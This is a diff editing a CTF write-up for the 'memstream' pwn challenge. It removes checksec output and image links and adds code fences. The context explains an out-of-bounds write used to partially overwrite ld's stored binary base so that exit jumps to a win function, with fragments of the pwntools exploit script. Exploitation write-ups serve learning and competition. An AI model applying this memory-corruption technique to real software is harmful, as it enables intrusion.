@@ -4,16 +4,13 @@ Memstream was the second pwn challenge in the event. it was medium difficulty. H
 
 After running checksec on the binary, it shows that the binary is packed with UPX:
 
-
-itay@itay-Vortex-G25-8RD:~/Desktop/mystuff/mystuff/blackhat/pwn/second/player$ checksec --file=memstream
-[!] Did not find any GOT entries
-[*] '/home/itay/Desktop/mystuff/mystuff/blackhat/pwn/second/player/memstream'
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
     Packer:   Packed with UPX
+    
 We can see that the binary is with No Relro, and without stack canary.
 
 Now, let’s look for vulnerabilities.
@@ -31,13 +28,10 @@ There is not a read option, which hints that our solution should be without any 
 Exploitation
 With my OOB write, I was thinking what can I overwrite. I saw in GDB, that when running our memstream binary, it is not loaded in 0x55***000 as usual, but in 0x7ff****000, which means it has been mmaped (UPX binaries are weird)
 
-/blackhatmea/image-1.png
-
 This means that it is a constant offset from our dynamic libaries (i.e ld). With that in mind, we can overwrite anything we want from there.
 
 One thing I knew, is that ld stores the binary base address in its writable segment. Then, when exiting the program, it will jump to the memory inside that address + 0x3d88:
 
-https://github.com/itaybel/Weekly-CTF/assets/56035342/0844b927-c56d-4515-b14a-41320393bb8a
 
 If rax is *(0x7ffff7fef2e0) = 0x7ffff7ff7000, it will do call [rax + 0x3d88], which under normal circumstances is __do_global_dtors_aux.
 
@@ -58,16 +52,18 @@ In my script I overwrote it to be 0x8229:
 	seek(-offset_base2)
 	win_offset = 0x8229
 	write(2, p16(win_offset))
+ 
 Then, the same issue occurs when we partially overwrite the second base address, I just guessed 0x5638:
-
+```
 	offset_base_win = 0x5d80
   seek(-offset_base_win)
 	write(2, p16(0x5638 - 0x3d88))
 	write(-1, "b") #trigger exit
+ ```
 In total, we bruteforced 2 nibbles, and each one has a 1/16 success rate. so we will have 1/16*1/16=1/256 success rate.
 
 Here is my final script, which will be need to run multiple times to succeed:
-
+```
 from pwn import *
 
 
@@ -111,3 +107,5 @@ while True:
 		continue
 	finally:
 		p.interactive()
+
+```
